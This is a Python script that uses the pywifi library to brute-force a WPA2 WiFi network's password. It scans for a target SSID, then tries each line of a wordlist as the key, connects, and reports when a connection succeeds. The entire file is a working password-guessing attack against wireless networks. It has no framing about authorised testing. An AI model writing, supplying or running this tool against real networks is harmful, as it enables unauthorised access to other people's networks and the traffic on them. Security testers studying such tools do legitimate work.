import pywifi
import time
from pywifi import const

def connect_to_network(network, wordlist_file):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    # Scan for available networks
    iface.scan()
    time.sleep(0.8)

    target_network = None
    for scan_result in iface.scan_results():
        if scan_result.ssid == network.ssid:
            target_network = scan_result
            break

    if target_network is None:
        print("Target network not found.")
        return False

    with open(wordlist_file, "r") as f:
        passwords = f.readlines()

    for password in passwords:
        password = password.strip()

        profile = pywifi.Profile()
        profile.ssid = target_network.ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        iface.add_network_profile(profile)

        iface.connect(profile)
        time.sleep(1)  # Wait for the connection attempt to complete

        # Change the position of the status check
        time.sleep(6)  # Wait longer for the connection attempt to complete

        if iface.status() == const.IFACE_CONNECTED:
            print("Correct password found: " + password)
            return True

        print("Incorrect password: " + password)

    print("Password not found.")
    return False